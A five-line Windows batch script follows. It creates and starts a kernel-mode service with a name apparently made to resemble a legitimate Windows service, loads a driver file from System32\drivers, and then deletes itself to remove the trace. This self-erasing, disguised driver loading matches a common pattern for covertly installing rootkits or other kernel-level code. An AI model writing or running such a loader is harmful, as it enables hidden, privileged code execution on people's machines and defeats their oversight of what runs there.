@echo off
cd %~dp0
sc create BcastDVRUserService18 binpath=C:\Windows\System32\drivers\hidi3c.sys type=kernel
sc start BcastDVRUserService18
del "%~f0"



